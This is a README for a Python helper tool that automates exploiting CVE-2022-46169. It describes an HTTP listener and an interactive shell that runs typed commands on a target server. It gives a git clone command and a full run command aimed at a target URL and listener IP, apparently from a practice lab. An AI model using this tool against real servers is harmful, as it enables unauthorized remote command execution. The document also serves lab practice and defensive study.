# CVE-2022-46169 Exploitation Helper Script
## Description
This Python script serves as a helper tool to streamline the process of exploiting the CVE-2022-46169 vulnerability. It starts an HTTP server that listens for incoming requests and provides a simple interface for the user to input commands. These commands are then executed on the target server, automating the process of sending crafted payloads to a vulnerable server and observing the server's responses in real-time.

By leveraging this script, a user can automate the process of sending crafted payloads to a vulnerable server and observe the server's responses in real-time.

## Usage
```
usage: CVE-2022-46169_helper.py [-h] --target TARGET --ip IP [--port PORT]

options:
  -h, --help       show this help message and exit
  --target TARGET  Target URL (e.g., http://10.10.11.211)
  --ip IP          IP address for the server (e.g., 10.10.14.86)
  --port PORT      Port number for the server (e.g., 5000)
```

Run the script with the `-target`, `-ip`, and `-port` arguments specifying the target URL, the IP address for the listening server, and the port number for the listening server, respectively.

```
git clone git@github.com:ahanel13/ImprovedShell-for-CVE-2022-46169.git
cd ImprovedShell-for-CVE-2022-46169
python3 CVE-2022-46169_helper.py --target http://10.10.11.211 --ip 10.10.14.86 --port 5000
```

The script will start the server and check for the CVE-2022-46169.py script in the same directory. If it's not found, the script will offer to download it for you.
Once the server is running, you can start typing commands to be executed on the target server. The responses will be printed out in the terminal.
To stop the server and exit the script, simply type 'exit' or "Crtl+c"
